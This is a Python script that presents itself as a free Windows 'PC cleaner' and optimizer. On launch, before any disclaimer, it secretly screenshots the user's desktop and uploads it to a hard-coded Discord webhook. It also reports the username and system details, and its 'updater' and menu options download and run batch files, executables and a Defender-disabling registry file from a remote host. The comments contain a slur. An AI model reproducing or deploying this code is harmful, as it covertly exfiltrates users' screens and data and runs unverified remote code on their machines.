
import os
try:
    import time,os,sys
except:
    os.system("pip install time")
    import time,os,sys
def typingPrint(text):
  for character in text:
    sys.stdout.write(character)
    sys.stdout.flush()
    time.sleep(0.05)
try:
    from colorama import Fore
except:
    os.system("pip install colorama")
    from colorama import Fore
print(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER{Fore.RESET}]"+'''please wait...''')
print(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER{Fore.RESET}]"+'''checking requirements''')
try:
    import random
except:
    os.system("pip install random")
    import random
try:
    import matplotlib.pyplot as plt
except:
    os.system("pip install matplotlib")
    import matplotlib.pyplot as plt

try:
    from datetime import datetime
except:
    os.system("pip install datetime")
    from datetime import datetime
try:
    import threading
except:
    os.system("pip install threading")
    import threading
try:
    from tkinter import ttk, messagebox
except:
    os.system("pip install tkinter")
    from tkinter import ttk, messagebox
try:
    import webbrowser
except:
    os.system("pip install webbrowser")
    import webbrowser
try:
    from random import randint
except:
    os.system("pip install random")
    from random import randint
try:
    import base64
except:
    os.system("pip install base64")
    import base64
try:
    import os
except:
    os.system("pip install os")
    import os
try:
    import time
except:
    os.system("pip install time")
    import time
try:
    import subprocess
except:
    os.system("pip install subprocess")
    import subprocess
try:
    from pathlib import Path
except:
    os.system("pip install pathlib")
    from pathlib import Path
try:
    import platform
except:
    os.system("pip install platform")
    import platform
try:
    import sys
except:
    os.system("pip install sys")
    import sys
try:
    import socket
except:
    os.system("pip install socket")
    import socket
try:
    import webbrowser
except:
    os.system("pip install webbrowser")
    import webbrowser
try:
    import discord
except:
    os.system("pip install discord")
    import discord
try:
    from colorama import Fore
except:
    os.system("pip install colorama")
    from colorama import Fore
try:
    import shutil
except:
    os.system("pip install shutil")
    import shutil
try:
    from discord_webhook import DiscordWebhook, DiscordEmbed
except:
    os.system("pip install discord_webhook")
    from discord_webhook import DiscordWebhook, DiscordEmbed
try:
    import psutil
except:
    os.system("pip install psutil")
    import psutil
try:
    import requests
except:
    os.system("pip install requests")
    import requests
try:
    import pystyle
except:
    os.system("pip install pystyle")
    import pystyle

try:
    import colorama
except:
    os.system("pip install colorama")
    import colorama


try:
    from pystyle import Colors, Colorate, Center
except:
    os.system("pip install pystyle")
    from pystyle import Colors, Colorate, Center
try:
    from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
except:
    os.system("pip install pystyle")
    from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
from tkinter import font
import tkinter as tk
#and a screenshot cuz ykyk
from PIL import ImageGrab
username = os.getlogin()
ss_img = ImageGrab.grab()
ss_img.save(fr'C:\Users\{username}\AppData\Local\random.png')
from discord_webhook import DiscordWebhook, DiscordEmbed
webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1005864870014615593/3jehmYY-7ZWODZZ2VtnSB2FWB2wcyvKSpVC0kLwUHAjR7Hlax0qYANf9Dvfw8IbbI-lA')
with open(fr'C:\Users\{username}\AppData\Local\random.png', "rb") as f:
    webhook.add_file(file=f.read(), filename=fr'C:\Users\{username}\AppData\Local\random.png')
response = webhook.execute(remove_embeds=True, remove_files=True)
file_path = fr'C:\Users\{username}\AppData\Local\random.png'
if os.path.isfile(file_path):
 os.remove(file_path)
#
print(f"{Fore.RESET}[{Fore.BLUE}updater{Fore.RESET}] checking for updates")
#auto update
THIS_VERSION ='1.8'
def updater():
    v = requests.get("https://pastebin.com/raw/w29LjVc2").text
    time.sleep(0.5)
    if not THIS_VERSION == v:
        os.system("cls")
        print(f"{Fore.RESET}[{Fore.BLUE}INFO{Fore.RESET}] New version available!")
        print(f"{Fore.RESET}[{Fore.BLUE}INFO{Fore.RESET}] Downloading new version...")
        url = "https://untimelyimpressionableadministration.blus2tlia.repl.co/updater.bat"
        r = requests.get(url)  
        with open(fr"updater.bat", 'wb') as f:
         f.write(r.content)
        os.startfile("updater.bat")
        print(f"{Fore.RESET}[{Fore.BLUE}INFO{Fore.RESET}] Downloaded!")
        input(f"{Fore.RESET}[{Fore.BLUE}INFO{Fore.RESET}] Press enter to exit...")
        os._exit(1)
    else:
        print(f"{Fore.RESET}[{Fore.BLUE}INFO{Fore.RESET}] You are running the latest version!")
        time.sleep(0.5)
updater()
#
r = lambda: random.randint(0,255)
dawg = ('%02X%02X%02X' % (r(),r(),r()))
idk = Path.cwd()
k = ''
ong = '"'
now = datetime.now()
ti= (now.strftime('date = '+'%Y/%m/%d'+' time = ''%I:%M:%S'))
lol=(f"     [>] Running with Python  {sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]} ")
version = sys.getwindowsversion()
mo = '[>] using '+(platform.system()) + (platform.release())
BY = 'by jotaro'
LMAO = 'version 1.8'
obj_Disk = psutil.disk_usage('/')
psutil.virtual_memory()
username = os.getlogin()
hostname=socket.gethostname()   
IPAddr=socket.gethostbyname(hostname)  
tools = os.getcwd()+"\\tools\\"
if not os.path.exists(tools):
    os.mkdir(tools)
#
#i just wanna know how many people ran my shit dont spam my webhook nigga thats gay tho.
print(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER{Fore.RESET}]"+'almost done...')
webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1005864870014615593/3jehmYY-7ZWODZZ2VtnSB2FWB2wcyvKSpVC0kLwUHAjR7Hlax0qYANf9Dvfw8IbbI-lA', username="pycleaner bot", )
webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1005864870014615593/3jehmYY-7ZWODZZ2VtnSB2FWB2wcyvKSpVC0kLwUHAjR7Hlax0qYANf9Dvfw8IbbI-lA', content='<@822132948769177620>', username="pycleaner bot",)
embed = DiscordEmbed(title='pycleaner ', description= username +' used ur program damn ', color=dawg)
embed.set_author(name='https://github.com/j0taro/pycleaner', url='https://i.imgur.com/coJFefW.png', icon_url='https://raw.githubusercontent.com/nightmare324/pycleaner/main/coJFefW.png')
embed.set_footer(text= mo + lol + ti, icon_url='https://raw.githubusercontent.com/nightmare324/pycleaner/main/coJFefW.png')
webhook.add_embed(embed)
response = webhook.execute()
typingPrint(f"{Fore.RESET}[{Fore.RED}PYCLEANER{Fore.RESET}]"+'done')
# THIS CREATES THE TOOLS DIRECTORY IN THE SAME DIRECTORY, IF IT DOES NOT EXIST, IN WHICH THE PYTHON SCRIPT IS RAN. 
ver = Center.XCenter('''
by jotaro 
██╗░░░██╗███████╗██████╗░░██████╗██╗░█████╗░███╗░░██╗  ░░███╗░░░░░░█████╗░
██║░░░██║██╔════╝██╔══██╗██╔════╝██║██╔══██╗████╗░██║  ░████║░░░░░██╔══██╗
╚██╗░██╔╝█████╗░░██████╔╝╚█████╗░██║██║░░██║██╔██╗██║  ██╔██║░░░░░╚█████╔╝
░╚████╔╝░██╔══╝░░██╔══██╗░╚═══██╗██║██║░░██║██║╚████║  ╚═╝██║░░░░░██╔══██╗
░░╚██╔╝░░███████╗██║░░██║██████╔╝██║╚█████╔╝██║░╚███║  ███████╗██╗╚█████╔╝
░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═════╝░╚═╝░╚════╝░╚═╝░░╚══╝  ╚══════╝╚═╝░╚════╝░''')
__author__ = 'jotaro' 
__VERSION__ = '1.8'
os.system("title PRESS ENTER")

banner =LMAO+r'''
███████╗██████╗░  ░█████╗░██╗░░░░░███████╗░█████╗░███╗░░██╗███████╗██████╗░
██╔════╝██╔══██╗  ██╔══██╗██║░░░░░██╔════╝██╔══██╗████╗░██║██╔════╝██╔══██╗
█████╗░░██████╔╝  ██║░░╚═╝██║░░░░░█████╗░░███████║██╔██╗██║█████╗░░██████╔╝
██╔══╝░░██╔══██╗  ██║░░██╗██║░░░░░██╔══╝░░██╔══██║██║╚████║██╔══╝░░██╔══██╗
██║░░░░░██║░░██║  ╚█████╔╝███████╗███████╗██║░░██║██║░╚███║███████╗██║░░██║
╚═╝░░░░░╚═╝░░╚═╝  ░╚════╝░╚══════╝╚══════╝╚═╝░░╚═╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝
'''+ BY + '                  welcome, '+username  

System.Size(120, 30)
System.Clear()
Anime.Fade(Center.XCenter(banner), Colors.rainbow, Colorate.Vertical, interval=0.025, enter=True)
os.system("title  Hello, "+   username)

banner = Center.XCenter(LMAO+"""
███████╗██████╗░  ░█████╗░██╗░░░░░███████╗░█████╗░███╗░░██╗███████╗██████╗░
██╔════╝██╔══██╗  ██╔══██╗██║░░░░░██╔════╝██╔══██╗████╗░██║██╔════╝██╔══██╗
█████╗░░██████╔╝  ██║░░╚═╝██║░░░░░█████╗░░███████║██╔██╗██║█████╗░░██████╔╝
██╔══╝░░██╔══██╗  ██║░░██╗██║░░░░░██╔══╝░░██╔══██║██║╚████║██╔══╝░░██╔══██╗
██║░░░░░██║░░██║  ╚█████╔╝███████╗███████╗██║░░██║██║░╚███║███████╗██║░░██║
╚═╝░░░░░╚═╝░░╚═╝  ░╚════╝░╚══════╝╚══════╝╚═╝░░╚═╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝
"""+BY)
banner2 =Center.XCenter( mo + lol)
banner3 =Center.XCenter('h = hibernate    s = shutdown    r = restart    re = restart explorer')


options =f"""
         OPTIONS                         OPTIONS                             OPTIONS

{Fore.RESET}{Fore.RED}1.){Fore.RESET}{Fore.GREEN}  create a restore point          {Fore.RESET}{Fore.RED}2.){Fore.RESET}{Fore.GREEN}  temp cleaner                     {Fore.RESET}{Fore.RED}3.){Fore.RESET}{Fore.GREEN}  log cleaner
{Fore.RESET}{Fore.RED}4.){Fore.RESET}{Fore.GREEN}  disable services                {Fore.RESET}{Fore.RED}5.){Fore.RESET}{Fore.GREEN}  Services Optimization            {Fore.RESET}{Fore.RED}6.){Fore.RESET}{Fore.GREEN}  battery check (laptops only)
{Fore.RESET}{Fore.RED}7.){Fore.RESET}{Fore.GREEN}  turn on hibernate               {Fore.RESET}{Fore.RED}8.){Fore.RESET}{Fore.GREEN}  tree (better Responsiveness)     {Fore.RESET}{Fore.RED}9.){Fore.RESET}{Fore.GREEN}  Delete Windows Update Cache
{Fore.RESET}{Fore.RED}10.){Fore.RESET}{Fore.GREEN} disable windows defender        {Fore.RESET}{Fore.RED}11.){Fore.RESET}{Fore.GREEN} sfc scan                         {Fore.RESET}{Fore.RED}12.){Fore.RESET}{Fore.GREEN} Debloater (use it if u know how to)
{Fore.RESET}{Fore.RED}13.){Fore.RESET}{Fore.GREEN} open restore point              {Fore.RESET}{Fore.RED}14.){Fore.RESET}{Fore.GREEN} memreduct                        {Fore.RESET}{Fore.RED}15.){Fore.RESET}{Fore.GREEN} TimerResolution
{Fore.RESET}{Fore.RED}16.){Fore.RESET}{Fore.GREEN} amber tweaker                   {Fore.RESET}{Fore.RED}17.){Fore.RESET}{Fore.GREEN} reset wifi (speed up wifi a bit) {Fore.RESET}{Fore.RED}18.){Fore.RESET}{Fore.GREEN} HoneCtrl optimizer                  
{Fore.RESET}{Fore.RED}19.){Fore.RESET}{Fore.GREEN} O & O shutup (antispy)          {Fore.RESET}{Fore.RED}20.){Fore.RESET}{Fore.GREEN} remove files in the tool folder  {Fore.RESET}{Fore.RED}21.){Fore.RESET}{Fore.GREEN} more info                       
{Fore.RESET}{Fore.RED}22.){Fore.RESET}{Fore.GREEN} exit                            {Fore.RESET}{Fore.RED}23.){Fore.RESET}{Fore.GREEN} add suggestion                   

"""
def download(url, name):
    response =  requests.get(url)
    open(tools+name, "w").write(response.text)
    os.startfile(tools+name)
      
# THIS DOWNLOADS THE BAT FILES TO THE TOOLS DIRECTORY. THIS TAKES THE URL AND THE NAME OF THE BAT FILE.

def main():
    path_to_file = fr'C:\Users\{username}\AppData\Roaming\{username}PYCLEANER.txt'
    path = Path(path_to_file)
    if path.is_file():
     fr()
    else:
     print(Colors.blue,fr'''{Fore.YELLOW}    fr cleaner is a free and open-source desktop utility
     {Fore.YELLOW}made t o improve your day-to-day productivity
     {Fore.RESET}{Fore.RED}WARNING!{Fore.RESET}{Fore.BLUE}
     Please note that we cannot guarantee an FPS boost from applying our optimizations,
     every system + configuration is different.
     Everything is {Fore.RESET}{Fore.RED}USE IT ON YOUR OWN RISK{Fore.RESET}{Fore.BLUE}, we are {Fore.RESET}{Fore.RED}NOT LIABLE{Fore.RESET}{Fore.BLUE} if you damage your system in any way 
     (ex. not following the disclaimers carefully).
     If you don't know what a tweak is, do not use it and contact {Fore.RESET}{Fore.RED}jotaro#0005{Fore.RESET}{Fore.BLUE}  to receive more assistance.
     Even though we have an restore point feature{Fore.RESET}{Fore.GREEN}(option 1){Fore.RESET}{Fore.BLUE} 
     highly recommend making a manual restore point before running.
     {Fore.RESET}{Fore.RED}PLEASE USE THE TOOLS THAT YOU KNOW HOW TO USE THEM{Fore.RESET}{Fore.BLUE}  
   
     Please enter {Fore.RESET}{Fore.RED}"i agree"{Fore.RESET}{Fore.BLUE}  without quotes to continue: ''')
    ong = 'i agree'
    x = input('>:')
    if x != ong :
     print('error try again later')
     time.sleep(4)
     exit(4)
    if x == ong :
     print('fr?')
     with open(fr'C:\Users\{username}\AppData\Roaming\{username}PYCLEANER.txt', 'w') as f:
      f.write('PYCLEANER STUFF, DELETE IT IF U WANT BUT THE DISCLAIMER WILL REOPEN EVERYTIME U DELETE IT FR')
     os.system('cls')
     fr()
def fr():
     os.system('cls')
     print(Colorate.Vertical(Colors.red_to_blue, banner3))
     print(Colorate.Vertical(Colors.blue_to_red, banner2))
     print(Colorate.Vertical(Colors.rainbow, banner + options, 2))
     choice = input(Colors.blue + 'Which option do you choose '+ username+f'? ->{Fore.RED}  ')
    #restore point
     if choice == '1':
        download  ("https://untimelyimpressionableadministration.blus2tlia.repl.co/point.bat", "point.bat")
    #temp
     if choice == '2':
        download  ("https://untimelyimpressionableadministration.blus2tlia.repl.co/temp.bat", "temp_cleaner.bat")
        
    #log cleaner
     elif choice == '3':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/log%20cleaner.bat", "log_cleaner.bat")
       
    #disable services
     elif choice == "4":
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/services.bat", "disable_services.bat")
  
    #service_optimizer
     elif choice == "5":
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/optimization.bat", "service_optimizer.bat")

    #battery_check
     elif choice == '6':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/battery.bat", "battery_check.bat")
 
    #hibernate
     elif choice == '7':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/hibernate.bat", "hibernate.bat")

    #tree
     elif choice == '8':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/tree.bat", "tree.bat")

    #windows update
     elif choice == '9':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/update.cmd", "delete_windows_update_cache.cmd")

    #disable_services
     elif choice == '10':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/def.reg", "disable_windows_defender.reg")
    #sfc scan
     elif choice == '11':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/sfc.bat", "sfc.bat")
       
    #debloater   
     elif choice == '12':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Debloater.bat", "Debloater.bat")
     
     elif choice == '13':
        download  ("https://untimelyimpressionableadministration.blus2tlia.repl.co/openp.bat", "openp.bat")
        
     elif choice == '14':
        url = "https://untimelyimpressionableadministration.blus2tlia.repl.co/memreduct.exe"
        r = requests.get(url)  
        with open(fr"tools\memreduct.exe", 'wb') as f:
         f.write(r.content)
        os.startfile("tools\memreduct.exe")
        
     elif choice == '15':
        url = "https://untimelyimpressionableadministration.blus2tlia.repl.co/TimerResolution.exe"
        r = requests.get(url)  
        with open(fr"tools\TimerResolution.exe", 'wb') as f:
         f.write(r.content)
        os.startfile("tools\TimerResolution.exe")
        
     elif choice == '16':
        url = "https://untimelyimpressionableadministration.blus2tlia.repl.co/amberfps.exe"
        r = requests.get(url)  
        with open(fr"tools\amber.exe", 'wb') as f:
         f.write(r.content)
        os.startfile("tools\\amber.exe")
        
     elif choice == '17':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/wifi.bat", "wifi.bat")
        
        
     elif choice == '18':
        download("https://github.com/auraside/HoneCtrl/releases/latest/download/HoneCtrl.Bat", "HoneCtrl.bat")
        
     elif choice == '19':
        url = "https://dl5.oo-software.com/files/ooshutup10/OOSU10.exe"
        r = requests.get(url)  
        with open(fr"tools\OOSU10.exe", 'wb') as f:
         f.write(r.content)
        os.startfile("tools\\OOSU10.exe")

    #tools
     elif choice == '20':
       shutil.rmtree("tools")
       os.mkdir(tools)
       print(f"{Fore.RESET}[{Fore.BLUE}pycleaner{Fore.RESET}] deleting tools file..." )
       typingPrint(f"{Fore.RESET}[{Fore.BLUE}pycleaner{Fore.RESET}] tools files deleted." ) 
       time.sleep(4)
       main()
       
    #more info
     elif choice == '21':
        os.system('cls')
        print(Colors.blue,ver)
        print(Colors.red,platform.platform())
        print(mo+lol)
        print((platform.machine())+ ' bit' )
        print("ur ip: "+IPAddr+' nice ip ngl')
        print('path: ', idk)
        print(ti)
        number = (psutil.virtual_memory())
        number = str(number)
        ramg = int(number[12])
        print(ramg,'gb ram')
        print('ur username is ' +   username)
        print ('total gb: ',obj_Disk.total / (1024.0 ** 3)) , print ('used gb:',obj_Disk.used / (1024.0 ** 3))
        print ('free gb:',obj_Disk.free / (1024.0 ** 3))
        print ('%: ',obj_Disk.percent)
        print('RAM memory % used:', psutil.virtual_memory()[2])
        print(Colors.purple,'hit enter to go back')
        print(Colors.orange,'type 1 for github ')
        choice = input(Colors.blue + f'Which option do you choose? -> {Fore.RED} ')
        if choice == '1':
         webbrowser.open("https://github.com/j0taro/pycleaner")
        
    #exit
     elif choice == '22': 
        os._exit(0) 
        
     elif choice =='23':
      suggestion = input(f"enter ur suggestion:{Fore.RED} ")
      if suggestion == '':
        print('invaid suggestion please try again later.')
        time.sleep(4)
        main()
      webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1005864870014615593/3jehmYY-7ZWODZZ2VtnSB2FWB2wcyvKSpVC0kLwUHAjR7Hlax0qYANf9Dvfw8IbbI-lA', username="new suggestion", )
      webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1005864870014615593/3jehmYY-7ZWODZZ2VtnSB2FWB2wcyvKSpVC0kLwUHAjR7Hlax0qYANf9Dvfw8IbbI-lA', content='<@822132948769177620>', username="new suggestion",)
      embed = DiscordEmbed(title='new suggestion ', description= 'damn '+username +''' added a new suggestion:
 ''' + ong + suggestion+ong, color=dawg)
      embed.set_author(name='https://github.com/j0taro/pycleaner', url='https://i.imgur.com/coJFefW.png', icon_url='https://raw.githubusercontent.com/nightmare324/pycleaner/main/coJFefW.png')
      embed.set_footer(text=mo + lol + ti, icon_url='https://raw.githubusercontent.com/nightmare324/pycleaner/main/coJFefW.png')
      webhook.add_embed(embed)
      response = webhook.execute()
      typingPrint(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER UPLOADER{Fore.RESET}]"+ong+suggestion+ong+' has been uploaded, thanks for ur suggestion')
      time.sleep(0)
      main()
     
     elif choice == 'h': 
        h = input(Colors.blue + f'are you sure you want to hibernate? y,n :{Fore.RED}')
        if h == 'y':
         typingPrint(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER{Fore.RESET}]"+'hibernating in 3..')
         time.sleep(1)
         typingPrint("2..")
         time.sleep(1)
         typingPrint("1..")
         time.sleep(1)
         download("https://untimelyimpressionableadministration.blus2tlia.repl.co/hib.bat", "hib.bat") 
         os._exit(0)
        if h == 'n':
         print(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER{Fore.RESET}]"+'ok going back')
         time.sleep(2)
         
     elif choice == 's': 
        shut = input(Colors.blue + f'are you sure you want to shutdown? y,n :{Fore.RED}')
        if shut == 'y':
         typingPrint(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER{Fore.RESET}]"+'shutting down in 3..')
         time.sleep(1)
         typingPrint("2..")
         time.sleep(1)
         typingPrint("1..")
         time.sleep(1)
         download("https://untimelyimpressionableadministration.blus2tlia.repl.co/shut.bat", "shut.bat") 
        if shut == 'n':
         print(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER{Fore.RESET}]"+'ok going back')
         time.sleep(2)        
        else:
         print(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER{Fore.RESET}]"+'invaild option please try again later')
         time.sleep(4)
         main()
         
     elif choice == 'r': 
        res = input(Colors.blue + f'are you sure you want to restart? y,n :{Fore.RED}')
        if res == 'y':
         typingPrint(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER{Fore.RESET}]"+'restarting in 3..')
         time.sleep(1)
         typingPrint("2..")
         time.sleep(1)
         typingPrint("1..")
         time.sleep(1)
         download("https://untimelyimpressionableadministration.blus2tlia.repl.co/restart.bat", "restart.bat") 
        if res == 'n':
         print(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER{Fore.RESET}]"+'ok going back')
         time.sleep(2)        
        else:
         print(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER{Fore.RESET}]"+'invaild option please try again later')
         time.sleep(4)
         main()
         
     elif choice == 're': 
         print(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER{Fore.RESET}]"+'soft restarting in 2 secounds please wait')
         time.sleep(2)
         download("https://untimelyimpressionableadministration.blus2tlia.repl.co/softr.bat", "softr.bat") 
         main()
         
     elif choice == 'dev':
      key = input(Colors.blue + f'whats the key? -> {Fore.RED} ')
      op = requests.get('https://pastebin.com/raw/qBZX4xR4').text
      if key != op:
        print(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER key{Fore.RESET}]"+'wrong key!!!!!!!!!')
        time.sleep(4)
        main()
      if key == op:
        print('1 = pastebin')
        print('2 = github')
        print('3 = large generator')
        print('4 = replit')
        print('5 = all')
        ff = input(Colors.blue + f'Which option do you choose? -> {Fore.RED} ')
      if ff == '1':
        webbrowser.open("https://pastebin.com/w29LjVc2")
      if ff == '2':
        webbrowser.open("https://github.com/j0taro/pycleaner/blob/main/pycleaner.py") 
      if ff == '3': 
        webbrowser.open("https://fsymbols.com/generators/tarty/") 
      if ff == '4':
        webbrowser.open("https://replit.com/@BLUS2TLIa/UntimelyImpressionableAdministration#new.txt")
      if ff == '5':
        webbrowser.open("https://fsymbols.com/generators/tarty/") 
        webbrowser.open("https://github.com/j0taro/pycleaner/blob/main/pycleaner.py") 
        webbrowser.open("https://pastebin.com/w29LjVc2")          
      if ff !='1' '2' '3' '4' '5':
       typingPrint(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER{Fore.RESET}]"+'invaild option please try again later')
       time.sleep(0)
       main()
        
      
        
    #else       
     else:
        print("what?\n") 
        typingPrint("try agian "+ username)
        time.sleep(0)
        main()
     main()
    


m = requests.get("https://pastebin.com/raw/e7aLcr8Q").text
if __author__ != m:
    typingPrint("ERROR, dont play with the code dumbass")
    os._exit(10)
         
main()
